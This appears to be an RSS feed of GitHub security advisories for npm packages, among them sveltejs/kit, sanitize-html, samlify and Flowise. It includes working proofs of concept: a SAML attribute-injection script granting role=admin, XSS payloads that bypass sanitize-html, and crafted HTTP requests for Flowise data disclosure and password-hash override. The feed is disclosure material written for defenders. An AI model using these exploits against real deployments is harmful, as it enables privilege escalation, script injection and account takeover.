<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-21T18:21:06.865Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@sveltejs/kit] @sveltejs/kit: `query.batch` cross-talk]]></title>
        <id>https://github.com/advisories/GHSA-hgv7-v322-mmgr</id>
        <link href="https://github.com/advisories/GHSA-hgv7-v322-mmgr"/>
        <updated>2026-05-21T17:59:06.000Z</updated>
        <content type="html"><![CDATA[<p><code>query.batch()</code> could, under very rare and specific timings, cause concurrent requests from different users to merge and resolve under single request context, enabling cross-user data disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sveltejs/kit/security/advisories/GHSA-hgv7-v322-mmgr">https://github.com/sveltejs/kit/security/advisories/GHSA-hgv7-v322-mmgr</a></li>
<li><a href="https://github.com/advisories/GHSA-hgv7-v322-mmgr">https://github.com/advisories/GHSA-hgv7-v322-mmgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgv7-v322-mmgr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T17:59:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[md-fileserver] md-fileserver: Stored/Reflected XSS when viewing Markdown (raw HTML allowed)]]></title>
        <id>https://github.com/advisories/GHSA-32q2-hhr5-6qvv</id>
        <link href="https://github.com/advisories/GHSA-32q2-hhr5-6qvv"/>
        <updated>2026-05-21T17:57:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A cross-site scripting (XSS) vulnerability exists in the application’s Markdown rendering logic. When user-supplied Markdown content is rendered, embedded raw HTML—including </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-32q2-hhr5-6qvv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T17:57:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[samlify] samlify: XML Injection in AttributeValue Allows Privilege Escalation in Signed SAML Assertions]]></title>
        <id>https://github.com/advisories/GHSA-34r5-q4jw-r36m</id>
        <link href="https://github.com/advisories/GHSA-34r5-q4jw-r36m"/>
        <updated>2026-05-21T17:14:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>samlify’s template substitution only escapes attribute contexts. Values inserted into element text (e.g., <code>&lt;saml:AttributeValue&gt;</code>) are not escaped. A normal user can inject XML markup into an attribute value (e.g., email, name) and add new <code>&lt;saml:Attribute&gt;</code> elements inside the signed assertion. The IdP then signs the tampered assertion and the SP accepts the injected attributes as trusted. This allows privilege escalation when attributes are used for authorization (roles/groups).</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>src/libsaml.ts</code> → <code>replaceTagsByValue()</code> only escapes placeholders when preceded by a quote (attribute context). Element text is inserted raw. The attribute builder inserts placeholders into element text:</p>
<pre><code>&lt;saml:AttributeValue ...&gt;{attrUserX}&lt;/saml:AttributeValue&gt;
</code></pre>
<p>Therefore, <code>&lt;/saml:AttributeValue&gt;…&lt;saml:Attribute …&gt;</code> is accepted and signed.</p>
<h2 id="proof-of-concept">Proof-of-concept</h2>
<ul>
<li>poc/attribute_injection.ts</li>
</ul>
<pre><code class="language-TS">import { readFileSync } from 'fs';
import * as samlify from '../index';
import * as validator from '@authenio/samlify-xsd-schema-validator';

samlify.setSchemaValidator(validator);

const { IdentityProvider, ServiceProvider, SamlLib: libsaml, Utility: util } = samlify as any;

const loginResponseTemplate = {
  context: '&lt;samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{ID}" Version="2.0" IssueInstant="{IssueInstant}" Destination="{Destination}" InResponseTo="{InResponseTo}"&gt;&lt;saml:Issuer&gt;{Issuer}&lt;/saml:Issuer&gt;&lt;samlp:Status&gt;&lt;samlp:StatusCode Value="{StatusCode}"/&gt;&lt;/samlp:Status&gt;&lt;saml:Assertion ID="{AssertionID}" Version="2.0" IssueInstant="{IssueInstant}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;&lt;saml:Issuer&gt;{Issuer}&lt;/saml:Issuer&gt;&lt;saml:Subject&gt;&lt;saml:NameID Format="{NameIDFormat}"&gt;{NameID}&lt;/saml:NameID&gt;&lt;saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"&gt;&lt;saml:SubjectConfirmationData NotOnOrAfter="{SubjectConfirmationDataNotOnOrAfter}" Recipient="{SubjectRecipient}" InResponseTo="{InResponseTo}"/&gt;&lt;/saml:SubjectConfirmation&gt;&lt;/saml:Subject&gt;&lt;saml:Conditions NotBefore="{ConditionsNotBefore}" NotOnOrAfter="{ConditionsNotOnOrAfter}"&gt;&lt;saml:AudienceRestriction&gt;&lt;saml:Audience&gt;{Audience}&lt;/saml:Audience&gt;&lt;/saml:AudienceRestriction&gt;&lt;/saml:Conditions&gt;{AttributeStatement}&lt;/saml:Assertion&gt;&lt;/samlp:Response&gt;',
  attributes: [
    { name: 'mail', valueTag: 'user.email', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },
    { name: 'injection', valueTag: 'user.injection', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },
  ],
};

const idp = IdentityProvider({
  privateKey: readFileSync('./test/key/idp/privkey.pem'),
  privateKeyPass: 'q9ALNhGT5EhfcRmp8Pg7e9zTQeP2x1bW',
  isAssertionEncrypted: false,
  metadata: readFileSync('./test/misc/idpmeta.xml'),
  loginResponseTemplate,
});

const sp = ServiceProvider({
  privateKey: readFileSync('./test/key/sp/privkey.pem'),
  privateKeyPass: 'VHOSp5RUiBcrsjrcAuXFwU1NKCkGA8px',
  isAssertionEncrypted: false,
  metadata: readFileSync('./test/misc/spmeta.xml'),
});

const buildTemplate = (_idp: any, _sp: any, _binding: any, user: any) =&gt; (template: string) =&gt; {
  const now = new Date();
  const fiveMinutesLater = new Date(now.getTime() + 300_000);
  const tvalue = {
    ID: _idp.entitySetting.generateID(),
    AssertionID: _idp.entitySetting.generateID(),
    Destination: _sp.entityMeta.getAssertionConsumerService('post'),
    Audience: _sp.entityMeta.getEntityID(),
    SubjectRecipient: _sp.entityMeta.getAssertionConsumerService('post'),
    NameIDFormat: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress',
    NameID: user.email,
    Issuer: _idp.entityMeta.getEntityID(),
    IssueInstant: now.toISOString(),
    ConditionsNotBefore: now.toISOString(),
    ConditionsNotOnOrAfter: fiveMinutesLater.toISOString(),
    SubjectConfirmationDataNotOnOrAfter: fiveMinutesLater.toISOString(),
    InResponseTo: 'request-id',
    StatusCode: 'urn:oasis:names:tc:SAML:2.0:status:Success',
    attrUserEmail: user.email,
    attrUserInjection: user.injection,
  };

  return { id: tvalue.ID, context: libsaml.replaceTagsByValue(template, tvalue) };
};

async function main() {
  const injection = [
    'safe',
    '&lt;/saml:AttributeValue&gt;&lt;/saml:Attribute&gt;',
    '&lt;saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"&gt;',
    '&lt;saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string"&gt;admin&lt;/saml:AttributeValue&gt;',
    '&lt;/saml:Attribute&gt;',
    '&lt;saml:Attribute Name="injection" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"&gt;',
    '&lt;saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string"&gt;safe'
  ].join('');

  const user = { email: 'user@esaml2.com', injection };
  const { context: SAMLResponse } = await idp.createLoginResponse(
    sp,
    { extract: { request: { id: 'request-id' } } },
    'post',
    user,
    buildTemplate(idp, sp, 'post', user)
  );

  const xml = util.base64Decode(SAMLResponse, true).toString();
  console.log('--- Generated XML snippet ---');
  console.log(xml.slice(xml.indexOf('&lt;saml:AttributeStatement'), xml.indexOf('&lt;/saml:AttributeStatement&gt;') + 26));

  const { extract } = await sp.parseLoginResponse(idp, 'post', { body: { SAMLResponse } });

  console.log('Parsed attributes:', extract.attributes);
}

main().catch(err =&gt; {
  console.error('PoC failed:', err?.message || err);
  process.exitCode = 1;
});
</code></pre>
<p><strong>Run:</strong></p>
<pre><code>  npm install --legacy-peer-deps
  npx ts-node poc/attribute_injection.ts
</code></pre>
<h2 id="impact">Impact</h2>
<p>A normal user can inject arbitrary attributes (e.g., <code>role=admin</code>) into a signed assertion and have them parsed by <code>sp.parseLoginResponse()</code>. This can grant elevated privileges in SPs that trust SAML attributes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tngan/samlify/security/advisories/GHSA-34r5-q4jw-r36m">https://github.com/tngan/samlify/security/advisories/GHSA-34r5-q4jw-r36m</a></li>
<li><a href="https://github.com/advisories/GHSA-34r5-q4jw-r36m">https://github.com/advisories/GHSA-34r5-q4jw-r36m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-34r5-q4jw-r36m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T17:14:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] Apostrophe has default XSS via `xmp` raw-text passthrough in `sanitize-html`]]></title>
        <id>https://github.com/advisories/GHSA-rpr9-rxv7-x643</id>
        <link href="https://github.com/advisories/GHSA-rpr9-rxv7-x643"/>
        <updated>2026-05-21T16:59:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Under the default configuration, <code>sanitize-html</code> can turn attacker-controlled content inside a disallowed <code>xmp</code> element into live HTML or JavaScript. This is a sanitizer bypass in the default <code>disallowedTagsMode: 'discard'</code> path and can lead to stored XSS in applications that render sanitized output back to users.</p>
<h3 id="details">Details</h3>
<p>In <code>sanitize-html@2.17.3</code>, the default <code>nonTextTags</code> list includes only <code>script</code>, <code>style</code>, <code>textarea</code>, and <code>option</code> in <code>index.js</code> lines 138-142. That means disallowed <code>xmp</code> tags are not treated as "drop the entire contents" tags.</p>
<p>Later, in the <code>ontext</code> handler at <code>index.js</code> lines 569-577, the code special-cases <code>textarea</code> and <code>xmp</code> and appends their text content directly to the output without escaping:</p>
<pre><code class="language-js">} else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') &amp;&amp; (tag === 'textarea' || tag === 'xmp')) {
  result += text;
}
</code></pre>
<p>Because <code>htmlparser2</code> treats <code>xmp</code> as a raw-text element, markup inside <code>xmp</code> is parsed as text on input but becomes live markup again once it is appended unescaped to the sanitized output.</p>
<p>This creates a default sanitizer bypass. For example, a disallowed <code>&lt;xmp&gt;</code> wrapper can be used to smuggle <code>&lt;script&gt;</code> or event-handler payloads through sanitization.</p>
<p>The README also appears to contradict the implementation. In the "Discarding the entire contents of a disallowed tag" section, the documented exception list names only <code>style</code>, <code>script</code>, <code>textarea</code>, and <code>option</code>, and does not mention <code>xmp</code>.</p>
<h3 id="poc">PoC</h3>
<p>Tested locally against <code>sanitize-html@2.17.3</code> on Node.js <code>v25.2.1</code>.</p>
<ol>
<li>Install the package:</li>
</ol>
<pre><code class="language-bash">npm install sanitize-html
</code></pre>
<ol start="2">
<li>Run the following script:</li>
</ol>
<pre><code class="language-js">const sanitizeHtml = require('sanitize-html');

console.log(sanitizeHtml('&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;'));
console.log(sanitizeHtml('&lt;xmp&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/xmp&gt;'));
console.log(sanitizeHtml('&lt;xmp&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;/xmp&gt;'));
</code></pre>
<ol start="3">
<li>Observed output:</li>
</ol>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
</code></pre>
<ol start="4">
<li>Render any of the returned strings in a browser context that trusts <code>sanitize-html</code> output, for example:</li>
</ol>
<pre><code class="language-js">const dirty = '&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/xmp&gt;';
const clean = sanitizeHtml(dirty);
</code></pre>
<p>If <code>clean</code> is inserted into the DOM or stored and later rendered as trusted HTML, the attacker-controlled script executes.</p>
<h3 id="impact">Impact</h3>
<p>This is a cross-site scripting vulnerability in the default sanitizer behavior. Any application that uses <code>sanitize-html</code> defaults and then renders the returned HTML as trusted output is impacted. A remote attacker who can submit HTML content can trigger execution of arbitrary JavaScript in another user's browser when that content is viewed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rpr9-rxv7-x643">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rpr9-rxv7-x643</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/issues/5418">https://github.com/apostrophecms/apostrophe/issues/5418</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/8d4c882b4ed3a7ce802cd87f89f0c1cb7482b8c2">https://github.com/apostrophecms/apostrophe/commit/8d4c882b4ed3a7ce802cd87f89f0c1cb7482b8c2</a></li>
<li><a href="https://github.com/advisories/GHSA-rpr9-rxv7-x643">https://github.com/advisories/GHSA-rpr9-rxv7-x643</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpr9-rxv7-x643</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-14T18:26:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tootallnate/once] @tootallnate/once vulnerable to Incorrect Control Flow Scoping]]></title>
        <id>https://github.com/advisories/GHSA-vpq2-c234-7xj6</id>
        <link href="https://github.com/advisories/GHSA-vpq2-c234-7xj6"/>
        <updated>2026-05-21T16:55:50.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3449">https://nvd.nist.gov/vuln/detail/CVE-2026-3449</a></li>
<li><a href="https://github.com/TooTallNate/once/issues/8">https://github.com/TooTallNate/once/issues/8</a></li>
<li><a href="https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a">https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612">https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612</a></li>
<li><a href="https://github.com/TooTallNate/once/releases/tag/v2.0.1">https://github.com/TooTallNate/once/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vpq2-c234-7xj6">https://github.com/advisories/GHSA-vpq2-c234-7xj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpq2-c234-7xj6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-03T06:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tootallnate/once] @tootallnate/once vulnerable to Incorrect Control Flow Scoping]]></title>
        <id>https://github.com/advisories/GHSA-vpq2-c234-7xj6</id>
        <link href="https://github.com/advisories/GHSA-vpq2-c234-7xj6"/>
        <updated>2026-05-21T16:55:50.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3449">https://nvd.nist.gov/vuln/detail/CVE-2026-3449</a></li>
<li><a href="https://github.com/TooTallNate/once/issues/8">https://github.com/TooTallNate/once/issues/8</a></li>
<li><a href="https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a">https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612">https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612</a></li>
<li><a href="https://github.com/TooTallNate/once/releases/tag/v2.0.1">https://github.com/TooTallNate/once/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vpq2-c234-7xj6">https://github.com/advisories/GHSA-vpq2-c234-7xj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpq2-c234-7xj6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-03T06:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Cross-Workspace Chatflow Disclosure via chatflows/apikey Endpoint Returns All Unprotected Chatflows]]></title>
        <id>https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</id>
        <link href="https://github.com/advisories/GHSA-c2c9-mfw7-p8hw"/>
        <updated>2026-05-20T15:45:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/api/v1/chatflows/apikey/:apikey</code> endpoint (whitelisted, accessible with API key auth only) returns all chatflows bound to the provided API key AND all chatflows across the entire system that have no API key assigned. This crosses workspace boundaries, allowing a user in Workspace A who has a valid API key to read the full configuration (including flowData, chatbotConfig, system prompts, and node configurations) of chatflows from Workspace B, Workspace C, and all other workspaces, as long as those chatflows have no API key assigned.</p>
<h2 id="details">Details</h2>
<p>The controller at <code>packages/server/src/controllers/chatflows/index.ts:90-107</code> validates the API key and calls the service:</p>
<pre><code class="language-typescript">const getChatflowByApiKey = async (req: Request, res: Response, next: NextFunction) =&gt; {
    try {
        const apikey = await apiKeyService.getApiKey(req.params.apikey)
        if (\!apikey) {
            return res.status(401).send("Unauthorized")
        }
        const apiResponse = await chatflowsService.getChatflowByApiKey(apikey.id, req.query.keyonly)
        return res.json(apiResponse)  // Returns full chatflow objects with flowData
    } catch (error) {
        next(error)
    }
}
</code></pre>
<p>The service at <code>packages/server/src/services/chatflows/index.ts:223-245</code> builds the database query:</p>
<pre><code class="language-typescript">const getChatflowByApiKey = async (apiKeyId: string, keyonly?: unknown): Promise&lt;any&gt; =&gt; {
    const appServer = getRunningExpressApp()
    let query = appServer.AppDataSource.getRepository(ChatFlow)
        .createQueryBuilder("cf")
        .where("cf.apikeyid = :apikeyid", { apikeyid: apiKeyId })
    if (keyonly === undefined) {
        // When keyonly is not set (default), also return ALL chatflows with no API key
        query = query.orWhere("cf.apikeyid IS NULL").orWhere("cf.apikeyid = ''")
    }
    const dbResponse = await query.orderBy("cf.name", "ASC").getMany()
    return dbResponse  // Returns full ChatFlow entities including flowData
}
</code></pre>
<p>When <code>keyonly</code> is not provided as a query parameter (which is the default case), the query expands to include:</p>
<ul>
<li>All chatflows bound to the provided API key (same workspace, expected behavior)</li>
<li>ALL chatflows with <code>apikeyid IS NULL</code> (any workspace, no workspace filter)</li>
<li>ALL chatflows with empty <code>apikeyid</code> (any workspace, no workspace filter)</li>
</ul>
<p>There is NO <code>workspaceId</code> filter in this query. The response includes the full <code>ChatFlow</code> entity, which contains:</p>
<ul>
<li><code>flowData</code> - the complete workflow graph including system prompts, model names, internal URLs, custom code</li>
<li><code>chatbotConfig</code> - chatbot configuration including allowed origins</li>
<li><code>apiConfig</code> - API configuration and override settings</li>
<li><code>textToSpeech</code> / <code>speechToText</code> - TTS/STT configuration including credential IDs</li>
<li><code>analytic</code> - analytics configuration</li>
</ul>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Step 1: Attacker has a valid API key for Workspace A
API_KEY="&lt;attacker-workspace-a-api-key&gt;"

# Step 2: Query the chatflows/apikey endpoint WITHOUT keyonly parameter
# Returns the attacker chatflows PLUS all chatflows without API keys from ALL workspaces
curl -s "http://localhost:3000/api/v1/chatflows/apikey/" | jq ".[].workspaceId"

# Step 3: With keyonly parameter, only chatflows bound to the API key are returned
curl -s "http://localhost:3000/api/v1/chatflows/apikey/?keyonly=true" | jq ".[].workspaceId"
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cross-Workspace Information Disclosure</strong>: A user in any workspace can read the full configuration of chatflows from all other workspaces that do not have an API key assigned. This breaks workspace isolation.</li>
<li><strong>Intellectual Property Exposure</strong>: System prompts, custom function code, and workflow architecture of chatflows from other workspaces/organizations are exposed.</li>
<li><strong>Credential Reference Leakage</strong>: The <code>textToSpeech</code> and <code>speechToText</code> fields include credential IDs, which can be abused via the TTS generate endpoint.</li>
<li><strong>Amplified by Default</strong>: Most chatflows are created without an API key assigned (API keys are opt-in), so the majority of chatflows in a multi-workspace deployment are affected.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add workspace scoping to the <code>getChatflowByApiKey</code> query by passing the API key workspace ID and filtering the OR clause:</p>
<pre><code class="language-typescript">// packages/server/src/services/chatflows/index.ts
const getChatflowByApiKey = async (apiKeyId: string, keyonly?: unknown, workspaceId?: string): Promise&lt;any&gt; =&gt; {
    const appServer = getRunningExpressApp()
    let query = appServer.AppDataSource.getRepository(ChatFlow)
        .createQueryBuilder("cf")
        .where("cf.apikeyid = :apikeyid", { apikeyid: apiKeyId })
    if (keyonly === undefined &amp;&amp; workspaceId) {
        // Only include unprotected chatflows from the SAME workspace
        query = query.orWhere(
            "(cf.apikeyid IS NULL OR cf.apikeyid = :empty) AND cf.workspaceId = :workspaceId",
            { empty: "", workspaceId }
        )
    }
    const dbResponse = await query.orderBy("cf.name", "ASC").getMany()
    return dbResponse
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-c2c9-mfw7-p8hw">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-c2c9-mfw7-p8hw</a></li>
<li><a href="https://github.com/advisories/GHSA-c2c9-mfw7-p8hw">https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2c9-mfw7-p8hw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-20T15:45:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Mass Assignment in PUT /api/v1/user Allows Authenticated Users to Override Password Hash and Bypass Password Change Verification]]></title>
        <id>https://github.com/advisories/GHSA-59fh-9f3p-7m39</id>
        <link href="https://github.com/advisories/GHSA-59fh-9f3p-7m39"/>
        <updated>2026-05-20T15:44:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Mass Assignment vulnerability in the PUT /api/v1/user endpoint allows authenticated users to directly modify restricted user fields, including the credential (password hash), bypassing the intended password change workflow.</p>
<p>Because the endpoint forwards the entire request body to the service layer without filtering, an attacker can override the credential field without providing the current password.</p>
<p>This bypasses several security protections including:</p>
<ul>
<li>old password verification</li>
<li>password hashing enforcement</li>
<li>password policy validation</li>
<li>session invalidation on password change</li>
</ul>
<p>While the vulnerability cannot be used to modify other users due to an ID check in the controller, it allows attackers who obtain a temporary session (e.g., via token theft or XSS) to establish persistent account access.</p>
<h3 id="details">Details</h3>
<p>The endpoint <strong>PUT /api/v1/user</strong> allows authenticated users to update their user profile.</p>
<p>The controller checks that the authenticated user matches the provided id, preventing direct IDOR:</p>
<pre><code class="language-typescript">const currentUser = req.user
const { id } = req.body

if (currentUser.id !== id) {
    throw new InternalFlowiseError(StatusCodes.FORBIDDEN)
}
</code></pre>
<p>However, the controller forwards the entire request body directly to the service layer without filtering:</p>
<pre><code class="language-typescript">const user = await userService.updateUser(req.body)
</code></pre>
<p>Inside UserService.updateUser, the incoming data is merged into the existing user entity:</p>
<pre><code class="language-typescript">updatedUser = queryRunner.manager.merge(User, oldUserData, newUserData)
</code></pre>
<p>Because newUserData is derived from req.body and there is no field allowlist, any field present in the User entity may be modified.</p>
<p>This includes sensitive fields such as:</p>
<ul>
<li>credential</li>
<li>tempToken</li>
<li>tokenExpiry</li>
<li>status</li>
<li>email</li>
</ul>
<p>The service implements a secure password change workflow that requires the following fields:</p>
<pre><code class="language-typescript">oldPassword
newPassword
confirmPassword
</code></pre>
<p>Example code:</p>
<pre><code class="language-typescript">if (newUserData.oldPassword &amp;&amp; newUserData.newPassword &amp;&amp; newUserData.confirmPassword) {
    if (!compareHash(newUserData.oldPassword, oldUserData.credential)) {
        throw new InternalFlowiseError(StatusCodes.BAD_REQUEST)
    }

    newUserData.credential = this.encryptUserCredential(newUserData.newPassword)
}
</code></pre>
<p>However, this logic can be bypassed by directly supplying a credential value in the request body.</p>
<p>Because the merge operation applies all fields from newUserData, the supplied credential hash will overwrite the stored password hash.</p>
<h3 id="poc">PoC</h3>
<p><strong>Step 1 -  Authenticate</strong></p>
<p>Login as any normal user and obtain a valid JWT token.</p>
<p><strong>POST /api/v1/auth/login</strong></p>
<p><strong>Step 2 - Generate a password hash</strong></p>
<p>Generate a bcrypt hash for a password you control.</p>
<p>Example:</p>
<p>bcrypt("attacker_password")</p>
<p>Example hash:</p>
<p>$2b$10$abc123examplehashvalue...</p>
<p>Step 3 - Send crafted update request</p>
<pre><code class="language-http">PUT /api/v1/user
Authorization: Bearer &lt;JWT_TOKEN&gt;
Content-Type: application/json

{
  "id": "&lt;your-user-id&gt;",
  "credential": "$2b$10$abc123examplehashvalue..."
}
</code></pre>
<p>Step 4 - Login with attacker password</p>
<p>The password hash in the database is replaced by the supplied value.</p>
<p>The attacker can now authenticate using:</p>
<p><strong>attacker_password</strong></p>
<p>without ever providing the previous password.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated users to bypass the password change security controls.</p>
<p>Security protections that are bypassed include:</p>
<p>current password verification</p>
<p>password hashing enforcement</p>
<p>password policy validation</p>
<p>session invalidation on password change</p>
<p>Although the controller prevents modification of other users' accounts, the vulnerability enables persistence after account compromise.</p>
<p>Example attack scenario:</p>
<ul>
<li>An attacker temporarily obtains a user's session (XSS, token leak, shared device, etc.)</li>
<li>The attacker sends the crafted update request with a new password hash</li>
<li>The attacker now permanently controls the account</li>
<li>Authentication logic bypass</li>
<li>Privilege persistence after compromise</li>
<li>Weak account recovery guarantees</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-59fh-9f3p-7m39">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-59fh-9f3p-7m39</a></li>
<li><a href="https://github.com/advisories/GHSA-59fh-9f3p-7m39">https://github.com/advisories/GHSA-59fh-9f3p-7m39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59fh-9f3p-7m39</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-20T15:44:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise: Hardcoded CORS wildcard on TTS endpoint enables cross-origin credential abuse from any webpage]]></title>
        <id>https://github.com/advisories/GHSA-m837-xvxr-vqwg</id>
        <link href="https://github.com/advisories/GHSA-m837-xvxr-vqwg"/>
        <updated>2026-05-20T15:38:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The TTS generation endpoint sets <code>Access-Control-Allow-Origin: *</code> as a hardcoded response header, independent of the server's CORS configuration. This enables any webpage to make cross-origin requests to generate speech using stored credentials.</p>
<h3 id="root-cause">Root Cause</h3>
<pre><code class="language-typescript">// packages/server/src/controllers/text-to-speech/index.ts:83
res.setHeader('Access-Control-Allow-Origin', '*')
res.setHeader('Access-Control-Allow-Headers', 'Cache-Control')
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Cross-origin credential abuse — any webpage can trigger TTS using stored credentials</li>
<li>Bypasses the server's CORS policy (<code>getCorsOptions()</code>) which is otherwise restrictive by default</li>
